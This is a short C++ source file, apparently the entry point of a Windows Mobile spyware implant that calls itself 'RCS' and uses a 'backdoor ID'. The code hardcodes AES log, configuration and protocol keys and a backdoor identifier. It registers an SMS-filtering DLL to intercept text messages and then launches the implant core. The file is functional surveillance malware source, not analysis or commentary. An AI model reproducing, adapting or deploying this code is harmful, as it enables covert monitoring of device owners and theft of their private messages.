// Mornella Static
#include "Core.h"
#include <stdio.h>

int WINAPI main(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow) {
	Core *core;

	// RCS 850 su rcs-castore
	BYTE LogKey[] = { 0xa0, 0x37, 0x85, 0xee, 0x50, 0x8d, 0xf0, 0x8b, 0xd5, 0xbc, 0x1d, 0xea, 0x54, 0x28, 0x1e, 0x3d };
	BYTE ConfKey[] = { 0x0C, 0xC5, 0x2C, 0xA2, 0xC8, 0x56, 0xDE, 0xF4, 0xE3, 0x63, 0xD8, 0x79, 0xA2, 0x80, 0xEE, 0x24 } ;

	// Sign sul DB
	BYTE ProtoKey[] = { 0x57, 0x2e, 0xbc, 0x94, 0x39, 0x12, 0x81, 0xcc, 0xf5, 0x3a, 0x85, 0x13, 0x30, 0xbb, 0x0d, 0x99 };

	g_hInstance = hInstance;

	// Configurazione artificiale di alcune variabili
	ZeroMemory(g_AesKey, 32);
	ZeroMemory(g_Challenge, 32);
	ZeroMemory(g_ConfKey, 32);

	ZeroMemory(g_BackdoorID, 16);
	ZeroMemory(g_ConfName, 32 * sizeof(WCHAR));

	CopyMemory(g_AesKey, LogKey, 16);
	CopyMemory(g_Challenge, ProtoKey, 16);
	CopyMemory(g_ConfKey, ConfKey, 16);
	CopyMemory(g_BackdoorID, "RCS_0000000850", strlen("RCS_0000000xxx"));
	CopyMemory(g_ConfName, L"cptm511.dql", WideLen(L"cptm511.dql"));
	// Fine configurazione artificiale

	// Unregistriamo la DLL
	HMODULE hSmsFilter;

	// Installiamo la DLL del filtro SMS
	hSmsFilter = NULL;
	typedef HRESULT (*pRegister)();
	pRegister RegisterFunction;

	// Unregistriamo la DLL per il filtering degli SMS
	hSmsFilter = LoadLibrary(SMS_DLL);

	if (hSmsFilter != NULL) {
		RegisterFunction = (pRegister)GetProcAddress(hSmsFilter, L"DllRegisterServer");

		if (RegisterFunction != NULL) {
			RegisterFunction();
		}

		FreeLibrary(hSmsFilter);
	}
	//

	core = new(std::nothrow) Core();

	if (core == NULL)
		return 0;

	core->Run();

	delete core;

	return 0;
}
